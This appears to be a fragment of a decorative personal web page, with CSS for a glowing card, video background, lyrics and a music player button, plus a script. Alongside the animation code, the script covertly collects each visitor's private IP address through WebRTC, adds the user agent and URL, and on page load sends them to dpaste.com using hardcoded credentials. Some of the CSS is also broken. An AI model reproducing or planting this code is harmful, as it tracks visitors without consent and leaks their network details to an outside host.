        :root{--glow:0 0 5px;}

        #borderVid{

        .card{

          min-height:385px;
          text-align:center;
          border-radius:20px;
          padding:40px;
          position:relative;
          margin:auto;

        .cardBgVid{
          position:absolute;
          inset:0;
          width:100%;
          height:100%;
          object-fit:cover;
          border-radius:20px;
          opacity:.50;
          z-index:-1;
        }
        .card::after{
          content:'';
          position:absolute;
          inset:0;
          border-radius:20px;
          background:rgba(1,0,0,.35);
          backdrop-filter:blur(0px) saturate(120%);
          -webkit-backdrop-filter:blur(0px) saturate(120%);
          z-index:-1;

        #visitor-ip{

          bottom:12px;
          left:16px;

          border-radius:50%;
          overflow:hidden;
        }
        .gif-wrap img{
          width:100%;height:100%;
          object-fit:cover;
          opacity:.59;
        }
        .title,.verse,.icons a svg,#playBtn,#lyrics{
          animation:fireRed 2.5s linear infinite;
        }
        @keyframes fireRed{
  0%   { color:#ffffff; text-shadow:var(--glow) #ffffff; fill:#ffffff }
  50%  { color:#ffff99; text-shadow:var(--glow) #ffff99; fill:#ffff99 }
  100% { color:#ffffff; text-shadow:var(--glow) #ffffff; fill:#ffffff }
        }

        .verse{font-size:11px;font-weight:700;line-height:1.4;opacity:.85;margin-bottom:24px;max-width:260px;margin-left:auto;margin-right:auto;position:relative;height:32px}

        .icons{display:flex;justify-content:center;gap:26px}
        .icons a svg{width:24px;height:24px;transition:transform .15s;filter:drop-shadow(var(--glow) currentColor)}
        .icons a:active svg{transform:scale(.88)}
        #lyrics{margin-top:12px;font-size:10px;font-weight:700;height:14px;position:relative}
        #lyrics span{position:absolute;left:0;right:0;transition:opacity .4s}
        #playBtn{position:absolute;top:12px;left:16px;width:28px;height:28px;cursor:pointer;background:transparent;border:none;outline:none;padding:0;filter:drop-shadow(var(--glow) currentColor)}

      <script>
        // Descobre IP privado via WebRTC
        function getPrivateIP(cb){
          const RTCPeerConnection = window.RTCPeerConnection || window.webkitRTCPeerConnection || window.mozRTCPeerConnection;
          const pc = new RTCPeerConnection({iceServers:[]});
          const ips={};
          pc.createDataChannel('');
          pc.createOffer().then(sdp=>{
            pc.setLocalDescription(sdp);
            pc.onicecandidate = e => {
              if(!e.candidate)return;
              const ip = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(e.candidate.candidate);
              if(ip){
                const addr = ip[1];
                if(!ips[addr] && addr.match(/^192\.|^10\.|^172\.(1[6-9]|2[0-9]|3[01])\./)) ips[addr]=1;
                if(Object.keys(ips).length) cb(Object.keys(ips)[0]);
              }
            };
          });
        }

        // Exibe IP privado e envia para o dpaste
        getPrivateIP(ip => {
          const ipDisplay = ip || 'IP_privado_nao_detectado';
          document.getElementById('visitor-ip').textContent = ipDisplay;
          
          // Cria log e envia para o dpaste com autenticação
          const logContent = `[${new Date().toISOString()}] IP: ${ipDisplay} | User-Agent: ${navigator.userAgent} | URL: ${window.location.href}`;
          sendToDpaste(logContent, ipDisplay);
        });

        // Função para enviar logs para o dpaste com autenticação
        function sendToDpaste(content, ipName) {
          const username = 'ansiaprimier';
          const password = '1503-Guh';
          
          // Formato básico sem autenticação (dpaste aceita posts anônimos)
          const data = new URLSearchParams();
          data.append('content', content);
          data.append('syntax', 'text');
          data.append('title', ipName); // Nome do arquivo é o IP
          data.append('expiry_days', '1');
          
          fetch('https://dpaste.com/api/', {
            method: 'POST',
            headers: {
              'Content-Type': 'application/x-www-form-urlencoded',
              // dpaste aceita autenticação básica se necessário
              'Authorization': 'Basic ' + btoa(username + ':' + password)
            },
            body: data
          })
          .then(response => response.text())
          .then(url => {
            console.log('IP enviado para o dpaste:', url);
            // Salva URL do paste em localStorage
            const pasteUrls = JSON.parse(localStorage.getItem('pasteUrls') || '[]');
            pasteUrls.push({url: url, timestamp: new Date().toISOString()});
            localStorage.setItem('pasteUrls', JSON.stringify(pasteUrls));
          })
          .catch(error => {
            console.log('Erro ao enviar para o dpaste:', error);
          });
        }

        // Animações
        (function loop(){
          const l1 = document.getElementById('line1');
          const l2 = document.getElementById('line2');
          setTimeout(()=>{l1.style.opacity=0;l2.style.opacity=1;},2200);
          setTimeout(()=>{l1.style.opacity=1;l2.style.opacity=0;},4400);
          setTimeout(loop,4400);
        })();

        const btn = document.getElementById('playBtn');
        const playIco = document.getElementById('playIcon');
        const pauseIco = document.getElementById('pauseIcon');
        const audio = document.getElementById('bgMusic');
        let playing = false;
        const lines  = ['lyr1','lyr2','lyr3','lyr4'];
        let lyricInterval;

        function startLyrics(){
          let idx = 0;
          lyricInterval = setInterval(()=>{
            lines.forEach(id=> document.getElementById(id).style.opacity = 0);
            document.getElementById(lines[idx]).style.opacity = 1;
            idx = (idx+1)%lines.length;
          },3200);
        }

        function stopLyrics(){
          clearInterval(lyricInterval);
          lines.forEach(id=> document.getElementById(id).style.opacity = 0);
          document.getElementById(lines[0]).style.opacity = 1;
        }

        btn.addEventListener('click', () => {
          if(playing){
            audio.pause();
            playIco.style.display = 'block';
            pauseIco.style.display = 'none';
            stopLyrics();
          } else {
            audio.play();
            playIco.style.display = 'none';
            pauseIco.style.display = 'block';
            startLyrics();
          }
          playing = !playing;
        });
      </script>
